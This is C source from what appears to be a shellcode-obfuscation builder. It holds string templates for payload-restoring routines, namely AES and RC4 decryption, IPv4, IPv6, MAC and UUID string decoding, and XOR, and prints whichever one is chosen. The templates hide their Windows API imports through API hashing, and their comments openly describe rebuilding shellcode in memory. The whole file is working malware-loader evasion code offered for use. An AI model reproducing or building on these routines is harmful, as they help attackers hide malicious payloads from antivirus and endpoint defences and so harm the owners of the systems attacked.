#include <windows.h>
#include <stdio.h>


#include "Common.h"


char _AesDecryption[] =
"#define NT_SUCCESS(status) (((NTSTATUS)(status)) >= 0)\n"
"#define KEYSIZE 32\n"
"#define IVSIZE 16\n\n"
"typedef struct _AES {\n"
"    PBYTE pPlainText;\n"
"    DWORD dwPlainSize;\n"
"    PBYTE pCipherText;\n"
"    DWORD dwCipherSize;\n"
"    PBYTE pKey;\n"
"    PBYTE pIv;\n"
"} AES, *PAES;\n\n"
"BOOL InstallAesDecryption(PAES pAes) {\n"
"    BOOL bSTATE = TRUE;\n"
"    BCRYPT_ALG_HANDLE hAlgorithm = NULL;\n"
"    BCRYPT_KEY_HANDLE hKeyHandle = NULL;\n"
"    ULONG cbResult = 0;\n"
"    DWORD dwBlockSize = 0;\n"
"    DWORD cbKeyObject = 0;\n"
"    PBYTE pbKeyObject = NULL;\n"
"    PBYTE pbPlainText = NULL;\n"
"    DWORD cbPlainText = 0;\n"
"    NTSTATUS STATUS = 0;\n\n"
"    //api hash\n"
"    HMODULE BcryptModule = GetModuleHandleH(bcrypt_Rotr32A);\n"
"    if (!BcryptModule) {\n"
"        hapi_LoaLibA = (fnLoadLibraryA)GetProcAddressH(GetModuleHandleH(ker32_Rotr32A), LoaLibA_Rotr32A);\n"
"        BcryptModule = hapi_LoaLibA(\"bcrypt.dll\");\n"
"    }\n\n"
"    hapi_BCryOpeAlgPro_init();\n"
"    hapi_BCryGetPro_init();\n"
"    hapi_BCrySetPro_init();\n"
"    hapi_BCryGenSymKey_init();\n"
"    hapi_BCryDec_init();\n"
"    hapi_BCryDesKey_init();\n"
"    hapi_BCryCloAlgPro_init();\n"
"\n\n"
"    STATUS = hapi_BCryOpeAlgPro(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);\n"
"    if (!NT_SUCCESS(STATUS)) {\n"
"        printf(\"[!] BCryOpeAlgPro Failed: 0x%08X \\n\", STATUS);\n"
"        bSTATE = FALSE; goto _EndOfFunc;\n"
"    }\n"
"    STATUS = hapi_BCryGetPro(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);\n"
"    if (!NT_SUCCESS(STATUS)) {\n"
"        printf(\"[!] BCryGetPro[1] Failed: 0x%08X \\n\", STATUS);\n"
"        bSTATE = FALSE; goto _EndOfFunc;\n"
"    }\n"
"    STATUS = hapi_BCryGetPro(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);\n"
"    if (!NT_SUCCESS(STATUS)) {\n"
"        printf(\"[!] BCryGetPro[2] Failed: 0x%08X \\n\", STATUS);\n"
"        bSTATE = FALSE; goto _EndOfFunc;\n"
"    }\n"
"    if (dwBlockSize != 16) {\n"
"        bSTATE = FALSE; goto _EndOfFunc;\n"
"    }\n"
"    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);\n"
"    if (!pbKeyObject) {\n"
"        bSTATE = FALSE; goto _EndOfFunc;\n"
"    }\n"
"    STATUS = hapi_BCrySetPro(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);\n"
"    if (!NT_SUCCESS(STATUS)) {\n"
"        printf(\"[!] BCrySetPro Failed: 0x%08X \\n\", STATUS);\n"
"        bSTATE = FALSE; goto _EndOfFunc;\n"
"    }\n"
"    STATUS = hapi_BCryGenSymKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, pAes->pKey, KEYSIZE, 0);\n"
"    if (!NT_SUCCESS(STATUS)) {\n"
"        printf(\"[!] BCryGenSymKey Failed: 0x%08X \\n\", STATUS);\n"
"        bSTATE = FALSE; goto _EndOfFunc;\n"
"    }\n"
"    STATUS = hapi_BCryDec(hKeyHandle, pAes->pCipherText, pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);\n"
"    if (!NT_SUCCESS(STATUS)) {\n"
"        printf(\"[!] BCryDec[1] Failed: 0x%08X \\n\", STATUS);\n"
"        bSTATE = FALSE; goto _EndOfFunc;\n"
"    }\n"
"    pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);\n"
"    if (!pbPlainText) {\n"
"        bSTATE = FALSE; goto _EndOfFunc;\n"
"    }\n"
"    STATUS = hapi_BCryDec(hKeyHandle, pAes->pCipherText, pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);\n"
"    if (!NT_SUCCESS(STATUS)) {\n"
"        printf(\"[!] BCryDec[2] Failed: 0x%08X \\n\", STATUS);\n"
"        bSTATE = FALSE; goto _EndOfFunc;\n"
"    }\n\n"
"_EndOfFunc:\n"
"    if (hKeyHandle) hapi_BCryDesKey(hKeyHandle);\n"
"    if (hAlgorithm) hapi_BCryCloAlgPro(hAlgorithm, 0);\n"
"    if (pbKeyObject) HeapFree(GetProcessHeap(), 0, pbKeyObject);\n"
"    if (pbPlainText && bSTATE) {\n"
"        pAes->pPlainText = pbPlainText;\n"
"        pAes->dwPlainSize = cbPlainText;\n"
"    }\n"
"    return bSTATE;\n"
"}\n"
"BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {\n"
"    if (!pCipherTextData || !sCipherTextSize || !pKey || !pIv) return FALSE;\n"
"    AES Aes = { .pKey = pKey, .pIv = pIv, .pCipherText = pCipherTextData, .dwCipherSize = sCipherTextSize };\n"
"    if (!InstallAesDecryption(&Aes)) return FALSE;\n"
"    *pPlainTextData = Aes.pPlainText;\n"
"    *sPlainTextSize = Aes.dwPlainSize;\n"
"    return TRUE;\n"
"}\n\n"
"PBYTE pDeobfuscatedPayload = NULL;\n"
"SIZE_T sDeobfuscatedSize = 0;\n\n"
"BOOL deobfuscate() {\n"
"    return SimpleDecryption(AesCipherText, sizeof(AesCipherText), AesKey, AesIv, (PVOID*)&pDeobfuscatedPayload, (DWORD*)&sDeobfuscatedSize);\n"
"}\n";




char _Rc4Decryption[] =
"// this is what SystemFunction032 function take as a parameter\n"
"typedef struct\n"
"{\n"
"DWORD	Length; \n"
"DWORD	MaximumLength; \n"
"PVOID	Buffer; \n"
"\n"
"} USTRING; \n\n"
"// defining how does the function look - more on this structure in the api hashing part\n"
"typedef NTSTATUS(NTAPI* fnSystemFunction032)(\n"
"	struct USTRING* Img, \n"
"	struct USTRING* Key\n"
"); \n\n"
"BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
"	\n"
"	// the return of SystemFunction032\n"
"	NTSTATUS	STATUS = NULL; \n"
"	\n"
"	// making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt\n"
"	USTRING		Key = { .Buffer = pRc4Key, 		.Length = dwRc4KeySize,		.MaximumLength = dwRc4KeySize }, \n"
"			Img = { .Buffer = pPayloadData, 	.Length = sPayloadSize,		.MaximumLength = sPayloadSize }; \n"
"	\n"
"	//api hash\n"
"	hapi_LoaLibA_init();\n\n"
"	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(hapi_LoaLibA(\"Advapi32\"), \"SystemFunction032\");\n"
"	\n"
"	// if SystemFunction032 calls failed it will return non zero value\n"
"	if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {\n"
"		printf(\"[!] SystemFunction032 FAILED With Error : 0x%0.8X\\n\", STATUS); \n"
"		return FALSE; \n"
"	}\n\n"
"	return TRUE; \n"
"}\n\n"
"PBYTE pDeobfuscatedPayload = Rc4CipherText;\n"
"SIZE_T sDeobfuscatedSize = sizeof(Rc4CipherText);\n\n"
"BOOL deobfuscate() {\n"
"	return Rc4EncryptionViSystemFunc032(Rc4Key, pDeobfuscatedPayload, sizeof(Rc4Key), sDeobfuscatedSize);\n"
"}\n\n";





char _Ipv4Deobfuscation[] =
"typedef NTSTATUS (NTAPI* fnRtlIpv4StringToAddressA)(\n"
"    PCSTR           S, \n"
"    BOOLEAN         Strict, \n"
"    PCSTR*          Terminator, \n"
"    PVOID           Addr\n"
"); \n\n\n"
"BOOL Ipv4Deobfuscation(IN CHAR* Ipv4Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {\n\n"
"        PBYTE       pBuffer         = NULL, \n"
"                    TmpBuffer       = NULL; \n\n"
"        SIZE_T      sBuffSize       = NULL; \n\n"
"        PCSTR       Terminator      = NULL; \n\n"
"        NTSTATUS    STATUS          = NULL; \n\n"
"        //api hash\n"
"        hapi_GetProHea_init();\n\n"
"        // getting RtlIpv4StringToAddressA address from ntdll.dll\n"
"        fnRtlIpv4StringToAddressA pRtlIpv4StringToAddressA = (fnRtlIpv4StringToAddressA)GetProcAddressH(GetModuleHandleH(ntdll_Rotr32A), RtlIpv4StrToAddA_Rotr32A); \n"
"        if (pRtlIpv4StringToAddressA == NULL) {    \n"
"                printf(\"[!] GetProcAddress Failed With Error : %d \\n\", GetLastError()); \n"
"                return FALSE; \n"
"        }\n"
"        // getting the real size of the shellcode (number of elements * 4 => original shellcode size)\n"
"        sBuffSize = NmbrOfElements * 4; \n"
"        // allocating mem, that will hold the deobfuscated shellcode\n"
"        pBuffer = (PBYTE)HeapAlloc(hapi_GetProHea(), 0, sBuffSize); \n"
"        if (pBuffer == NULL) {\n"
"            printf(\"[!] HeapAlloc Failed With Error : %d \\n\", GetLastError()); \n"
"            return FALSE; \n"
"        }\n"
"        // setting TmpBuffer to be equal to pBuffer\n"
"        TmpBuffer = pBuffer; \n\n\n"
"        // loop through all the addresses saved in Ipv4Array\n"
"        for (int i = 0; i < NmbrOfElements; i++) {\n"
"            // Ipv4Array[i] is a single ipv4 address from the array Ipv4Array\n"
"            if ((STATUS = pRtlIpv4StringToAddressA(Ipv4Array[i], FALSE, &Terminator, TmpBuffer)) != 0x0) {\n"
"                // if failed ...\n"
"                printf(\"[!] RtlIpv4StringToAddressA Failed At [%s] With Error 0x%0.8X\\n\", Ipv4Array[i], STATUS); \n"
"                return FALSE; \n"
"            }\n\n"
"            // tmp buffer will be used to point to where to write next (in the newly allocated memory)\n"
"            TmpBuffer = (PBYTE)(TmpBuffer + 4); \n"
"        }\n\n"
"        *ppDAddress = pBuffer; \n"
"        *pDSize = sBuffSize; \n"
"        return TRUE; \n"
"}\n\n"
"PBYTE pDeobfuscatedPayload = NULL;\n"
"SIZE_T sDeobfuscatedSize = NULL;\n\n\n"
"BOOL deobfuscate() {\n"
"    return Ipv4Deobfuscation(Ipv4Array, sizeof(Ipv4Array) / sizeof(Ipv4Array[0]), &pDeobfuscatedPayload, &sDeobfuscatedSize);\n"
"}\n\n";





char _Ipv6Deobfuscation[] =
"typedef NTSTATUS (NTAPI* fnRtlIpv6StringToAddressA)(\n"
"	PCSTR			S, \n"
"	PCSTR*			Terminator, \n"
"	PVOID			Addr\n"
"); \n\n\n"
"BOOL Ipv6Deobfuscation(IN CHAR* Ipv6Array[], IN SIZE_T NmbrOfElements, OUT PBYTE * ppDAddress, OUT SIZE_T * pDSize) {\n\n"
"		PBYTE		pBuffer		= NULL, \n"
"				TmpBuffer	= NULL; \n\n"
"		SIZE_T		sBuffSize	= NULL; \n\n"
"		PCSTR		Terminator	= NULL; \n\n"
"		NTSTATUS	STATUS		= NULL; \n\n"
"		//api hash\n"
"		hapi_GetProHea_init();\n\n"
"		// getting RtlIpv6StringToAddressA  address from ntdll.dll\n"
"		fnRtlIpv6StringToAddressA  pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddressH(GetModuleHandleH(ntdll_Rotr32A), RtlIpv6StrToAddA_Rotr32A); \n"
"		if (pRtlIpv6StringToAddressA == NULL) {	\n"
"				printf(\"[!] GetProcAddress Failed With Error : %d \\n\", GetLastError()); \n"
"				return FALSE; \n"
"		}\n"
"		// getting the real size of the shellcode (number of elements * 16 => original shellcode size)\n"
"		sBuffSize = NmbrOfElements * 16; \n"
"		// allocating mem, that will hold the deobfuscated shellcode\n"
"		pBuffer = (PBYTE)HeapAlloc(hapi_GetProHea(), 0, sBuffSize); \n"
"		if (pBuffer == NULL) {\n"
"			printf(\"[!] HeapAlloc Failed With Error : %d \\n\", GetLastError()); \n"
"			return FALSE; \n"
"		}\n"
"		// setting TmpBuffer to be equal to pBuffer\n"
"		TmpBuffer = pBuffer; \n\n\n"
"		// loop through all the addresses saved in Ipv6Array\n"
"		for (int i = 0; i < NmbrOfElements; i++) {\n"
"			// Ipv6Array[i] is a single ipv6 address from the array Ipv6Array\n"
"			if ((STATUS = pRtlIpv6StringToAddressA(Ipv6Array[i], &Terminator, TmpBuffer)) != 0x0) {\n"
"				// if failed ...\n"
"				printf(\"[!] RtlIpv6StringToAddressA Failed At [%s] With Error 0x%0.8X\\n\", Ipv6Array[i], STATUS); \n"
"				return FALSE; \n"
"			}\n\n"
"			// tmp buffer will be used to point to where to write next (in the newly allocated memory)\n"
"			TmpBuffer = (PBYTE)(TmpBuffer + 16); \n"
"		}\n\n"
"		*ppDAddress = pBuffer; \n"
"		*pDSize = sBuffSize; \n"
"		return TRUE; \n"
"}\n\n"
"PBYTE       pDeobfuscatedPayload = NULL;\n"
"SIZE_T      sDeobfuscatedSize = NULL;\n\n"
"BOOL deobfuscate() {\n"
"    return Ipv6Deobfuscation(Ipv6Array, sizeof(Ipv6Array) / sizeof(Ipv6Array[0]), &pDeobfuscatedPayload, &sDeobfuscatedSize);\n\n"
"}\n\n";




char _MacDeobfuscation[] =
"typedef NTSTATUS (NTAPI* fnRtlEthernetStringToAddressA)(\n"
"	PCSTR			S, \n"
"	PCSTR*			Terminator, \n"
"	PVOID			Addr\n"
"); \n\n\n"
"BOOL MacDeobfuscation(IN CHAR* MacArray[], IN SIZE_T NmbrOfElements, OUT PBYTE * ppDAddress, OUT SIZE_T * pDSize) {\n\n"
"		PBYTE		pBuffer		= NULL, \n"
"				TmpBuffer	= NULL; \n\n"
"		SIZE_T		sBuffSize	= NULL; \n\n"
"		PCSTR		Terminator	= NULL; \n\n"
"		NTSTATUS	STATUS		= NULL; \n\n"
"		//api hash\n"
"		hapi_GetProHea_init();\n\n"
"		// getting fnRtlEthernetStringToAddressA  address from ntdll.dll\n"
"		fnRtlEthernetStringToAddressA  pRtlEthernetStringToAddressA  = (fnRtlEthernetStringToAddressA)GetProcAddressH(GetModuleHandleH(ntdll_Rotr32A), RtlEthStrToAddA_Rotr32A); \n"
"		if (pRtlEthernetStringToAddressA  == NULL) {	\n"
"				printf(\"[!] GetProcAddress Failed With Error : %d \\n\", GetLastError()); \n"
"				return FALSE; \n"
"		}\n"
"		// getting the real size of the shellcode (number of elements * 6 => original shellcode size)\n"
"		sBuffSize = NmbrOfElements * 6; \n"
"		// allocating mem, that will hold the deobfuscated shellcode\n"
"		pBuffer = (PBYTE)HeapAlloc(hapi_GetProHea(), 0, sBuffSize); \n"
"		if (pBuffer == NULL) {\n"
"			printf(\"[!] HeapAlloc Failed With Error : %d \\n\", GetLastError()); \n"
"			return FALSE; \n"
"		}\n"
"		// setting TmpBuffer to be equal to pBuffer\n"
"		TmpBuffer = pBuffer; \n\n\n"
"		// loop through all the addresses saved in MacArray\n"
"		for (int i = 0; i < NmbrOfElements; i++) {\n"
"			// MacArray[i] is a single mac address from the array MacArray\n"
"			if ((STATUS = pRtlEthernetStringToAddressA(MacArray[i], &Terminator, TmpBuffer)) != 0x0) {\n"
"				// if failed ...\n"
"				printf(\"[!] RtlEthernetStringToAddressA  Failed At [%s] With Error 0x%0.8X\\n\", MacArray[i], STATUS); \n"
"				return FALSE; \n"
"			}\n\n"
"			// tmp buffer will be used to point to where to write next (in the newly allocated memory)\n"
"			TmpBuffer = (PBYTE)(TmpBuffer + 6); \n"
"		}\n\n"
"		*ppDAddress = pBuffer; \n"
"		*pDSize = sBuffSize; \n"
"		return TRUE; \n"
"}\n\n"
"\n"
"PBYTE       pDeobfuscatedPayload = NULL;\n"
"SIZE_T      sDeobfuscatedSize = NULL;\n\n"
"BOOL deobfuscate() {\n"
"    return MacDeobfuscation(MacArray, sizeof(MacArray) / sizeof(MacArray[0]), &pDeobfuscatedPayload, &sDeobfuscatedSize);\n\n"
"}\n\n";



char _UuidDeobfuscation[] =
"typedef RPC_STATUS (WINAPI* fnUuidFromStringA)(\n"
"	RPC_CSTR	StringUuid,\n"
"	UUID*		Uuid\n"
"); \n\n\n"
"BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE * ppDAddress, OUT SIZE_T * pDSize) {\n\n"
"		PBYTE		pBuffer		= NULL, \n"
"				TmpBuffer	= NULL; \n\n"
"		SIZE_T		sBuffSize	= NULL; \n\n"
"		PCSTR		Terminator	= NULL; \n\n"
"		NTSTATUS	STATUS		= NULL; \n\n"
"		//api hash\n"
"		hapi_LoaLibW_init();\n"
"		hapi_GetProHea_init();\n\n"
"		fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddressH(hapi_LoaLibW(TEXT(\"RPCRT4\")), UuidFromStringA_Rotr32A); \n"
"		if (pUuidFromStringA == NULL) {	\n"
"				printf(\"[!] GetProcAddress Failed With Error : %d \\n\", GetLastError()); \n"
"				return FALSE; \n"
"		}\n"
"		// getting the real size of the shellcode (number of elements * 16 => original shellcode size)\n"
"		sBuffSize = NmbrOfElements * 16; \n"
"		// allocating mem, that will hold the deobfuscated shellcode\n"
"		pBuffer = (PBYTE)HeapAlloc(hapi_GetProHea(), 0, sBuffSize); \n"
"		if (pBuffer == NULL) {\n"
"			printf(\"[!] HeapAlloc Failed With Error : %d \\n\", GetLastError()); \n"
"			return FALSE; \n"
"		}\n"
"		// setting TmpBuffer to be equal to pBuffer\n"
"		TmpBuffer = pBuffer; \n\n\n"
"		// loop through all the addresses saved in Ipv6Array\n"
"		for (int i = 0; i < NmbrOfElements; i++) {\n"
"			// UuidArray[i] is a single UUid address from the array UuidArray\n"
"			if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {\n"
"				// if failed ...\n"
"				printf(\"[!] UuidFromStringA  Failed At [%s] With Error 0x%0.8X\\n\", UuidArray[i], STATUS); \n"
"				return FALSE; \n"
"			}\n\n"
"			// tmp buffer will be used to point to where to write next (in the newly allocated memory)\n"
"			TmpBuffer = (PBYTE)(TmpBuffer + 16); \n"
"		}\n\n"
"		*ppDAddress = pBuffer; \n"
"		*pDSize = sBuffSize; \n"
"		return TRUE; \n"
"}\n\n"
"PBYTE       pDeobfuscatedPayload = NULL;\n"
"SIZE_T      sDeobfuscatedSize = NULL;\n\n"
"BOOL deobfuscate() {\n"
"    return UuidDeobfuscation(UuidArray, sizeof(UuidArray) / sizeof(UuidArray[0]), &pDeobfuscatedPayload, &sDeobfuscatedSize);\n"
"}\n\n";




char _XORDecryption[] =
"BOOL XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {\n"
"    for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {\n"
"        if (j >= sKeySize) {\n"
"            j = 0;\n"
"        }\n"
"        pShellcode[i] = pShellcode[i] ^ bKey[j];\n"
"    }\n"
"    return TRUE;\n"
"}\n"
"PBYTE pDeobfuscatedPayload = XORCipherText;\n"
"SIZE_T sDeobfuscatedSize = sizeof(XORCipherText);\n\n"
"BOOL deobfuscate() {\n"
"	return XorByInputKey(pDeobfuscatedPayload, sDeobfuscatedSize, XORKey, sizeof(XORKey));\n"
"}\n\n";





VOID PrintDecodeFunctionality(IN INT TYPE) {
	if (TYPE == 0){
		printf("[!] Missing Input Type (StringFunctions:362)\n");
		return;
	}

	switch (TYPE){

		case IPV4FUSCATION:
			printf("%s\n", _Ipv4Deobfuscation);
			break;

		case IPV6FUSCATION:
			printf("%s\n", _Ipv6Deobfuscation);
			break;

		case MACFUSCATION:
			printf("%s\n", _MacDeobfuscation);
			break;

		case UUIDFUSCATION:
			printf("%s\n", _UuidDeobfuscation);
			break;

		case AESENCRYPTION:
			printf("%s\n", _AesDecryption);
			break;

		case RC4ENCRYPTION:
			printf("%s\n", _Rc4Decryption);
			break;

		case XORENCRYPTION:
			printf("%s\n", _XORDecryption);
			break;

		default:
			printf("[!] Unsupported Type Entered : 0x%0.8X \n", TYPE);
			break;
	}

	
}

